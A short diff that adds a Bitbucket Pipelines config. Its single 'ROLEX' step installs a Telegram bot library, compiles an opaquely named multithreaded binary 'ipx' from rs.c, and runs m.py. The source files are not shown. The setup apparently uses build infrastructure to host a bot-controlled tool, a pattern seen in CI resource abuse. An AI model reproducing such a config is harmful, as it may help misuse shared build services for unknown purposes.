@@ -1,0 +1,11 @@
+pipelines:
+  default:
+    - step:
+        name: ROLEX
+        image: python:3.10
+        size: 2x 
+        script:
+          - echo "Starting pipeline..."
+          - pip install telebot pymongo aiohttp
+          - gcc rs.c -o ipx -pthread
+          - python3 m.py
